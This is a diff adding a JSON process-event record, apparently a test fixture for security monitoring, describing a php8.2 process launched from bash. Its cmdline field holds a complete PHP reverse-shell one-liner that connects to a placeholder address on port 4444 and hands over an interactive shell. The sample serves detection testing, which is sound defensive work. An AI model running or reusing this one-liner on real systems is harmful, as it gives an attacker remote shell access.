@@ -1,0 +1,12 @@
+{
+  "source": "process",
+  "process": {
+    "pid": 31337,
+    "ppid": 4100,
+    "comm": "php8.2",
+    "exe": "/usr/bin/php8.2",
+    "cmdline": "php -r $sock=fsockopen(\"203.0.113.7\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");",
+    "uid": 1000
+  },
+  "parent_comm": "bash"
+}
